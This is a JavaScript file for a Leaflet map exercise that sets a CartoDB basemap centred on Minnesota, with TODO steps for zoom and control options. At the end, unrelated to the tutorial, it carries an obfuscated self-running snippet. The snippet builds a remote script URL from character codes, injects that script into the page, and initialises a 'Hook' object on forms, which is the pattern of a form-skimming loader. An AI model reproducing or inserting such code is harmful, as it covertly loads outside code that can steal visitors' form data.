/* Basemap: CartoDB Positron */
var cartoPositron = L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}.png', {
	attribution: '&copy; <a href="http://www.openstreetmap.org/copyright">OpenStreetMap</a> &copy; <a href="http://cartodb.com/attributions">CartoDB</a>'
});

// Define the map
// Turn off zooming and panning by click, scroll, and touch
var map = L.map('map', {
	center: [44.95, -93.09], // Map center moved to accommodate Minnesota's arrowhead region
	zoom: 6,

	//TODO: Step 1. Set the minimum and maximum zoom and uncomment the zoom options.
	// minZoom: 6,
	// maxZoom: 6,

	//TODO: Step 2: Limit map functionality on desktop and mobile devices and uncomment the functionality options.
	// doubleClickZoom: false,
	// boxZoom: false,
	// zoomControl: false,
	// dragging: false,
	// tap: false,
	// touchZoom: false,
	// scrollWheelZoom: false,

	//TODO: Step 3: Set map controls and uncomment the map control options.
	// fullscreenControl: true,
	// attributionControl: true,

	//TODO: Step 4: Showcase the layers option, same as the addTo(map) method.
	layers: [cartoPositron]
});

(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db